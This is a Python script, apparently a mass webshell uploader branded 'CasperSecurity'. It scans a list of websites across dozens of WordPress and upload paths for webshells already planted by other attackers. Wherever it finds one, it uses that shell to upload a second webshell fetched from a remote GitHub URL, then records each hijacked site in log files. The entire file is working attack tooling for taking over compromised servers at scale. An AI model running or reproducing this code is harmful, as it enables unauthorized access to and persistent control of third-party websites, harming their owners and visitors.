 # -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print ("""  
{} [#]{} Created By ::
    {}  _____                           _____                      _ _         
    {} /  __ \                         /  ___|                    (_) |        
    {} | /  \/ __ _ ___ _ __   ___ _ __\ `--.  ___  ___ _   _ _ __ _| |_ _   _ 
    {} | |    / _` / __| '_ \ / _ \ '__|`--. \/ _ \/ __| | | | '__| | __| | | |
    {} | \__/\ (_| \__ \ |_) |  __/ |  /\__/ /  __/ (__| |_| | |  | | |_| |_| |
    {}  \____/\__,_|___/ .__/ \___|_|  \____/ \___|\___|\__,_|_|  |_|\__|\__, |
    {}                 | |                                                __/ |
    {}                 |_|                     {}Yanz {}CasperSecurity       |___/ 
    """.format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fr, fg))
requests.urllib3.disable_warnings()

ua = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

shells = {'f': ('index.php', requests.get("https://raw.githubusercontent.com/CasperSecurity/Webshells/main/index.php",headers=ua).text)} 

# Data to send along with the request
data = {
    'a': 'fm',
    'p': 'uploadFile',
    'ch': 'Windows-1251'
}

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def upload(url, ppp):
    try:
        requests.post(url,headers=ua,data=data, files=shells ,timeout=15)
        uploaded = url.replace(ppp,"index.php?Exploit=CasperSecurity")
        check = requests.get(uploaded,headers=ua, timeout=15)
        if 'CasperExV1' in check.content:
            print ' -| ' + url + ' --> {}[Uploaded]'.format(fg)
            open('Uploaders.txt', 'a').write(uploaded + '\n')
            pass
        else:
            print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except:
        pass

def yanz(url):
    try:
        url = 'http://' + URLdomain(url)
        paths = ["/","/images/","/uploads/","/assets/","/ALFA_DATA/","/ALFA_DATA/alfacgiapi/","/wordpress/","/site/","/js/","/wp-includes/js/tinymce/plugins/compat3x/css/","/wp-includes/js/tinymce/","/wp-includes/Text/","/wp-includes/rest-api/","/wp-includes/js/","/wp-includes/js/tinymce/plugins/compat3x/","/wp-content/plugins/Cache/","/css/","/cgi-bin/cgi-bin/","/cgi-bin/","/.wp-cli/","/.well-known/pki-validation","/wp-admin/css/colors/coffee/","/wp-content/", "/wp-admin/", "/wp-includes/", "/wp-content/upgrade/", "/wp-content/dir/", "/wp-content/fonts/", "/wp-content/languages/", "/wp-content/plugins/", "/wp-content/themes/", "/wp-content/upgrade/", "/wp-includes/ID3/", "/wp-content/css/"]
        filez = ["api.php", "wp-login.php", "about.php", "about.php7", "alfa-rex.php", "alfa-rex.php7", "alfa-rex.php56", "alfa-rex.php8", "admin.php","ioxi002.PhP7","ynz.PhP7","themes.php","erin1.PhP7","fosil.php","ws.php.php","ws.php"]
        for path in paths:
            for file in filez:
                check = requests.get(url + path + file, headers=ua, timeout=15)
                if 'Yanz Webshell' in check.content:
                    print ' -| ' + url + ' --> {}[Vuln]'.format(fc)
                    shelz = url + path + file
                    open('Shells.txt', 'a').write(shelz + '\n')
                    upload(shelz, filez)
                    pass
                else:
                    print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except:
        pass

mp = Pool(150)
mp.map(yanz, target)
mp.close()
mp.join()

print '\n [!] {}Saved in Shells.txt'.format(fc)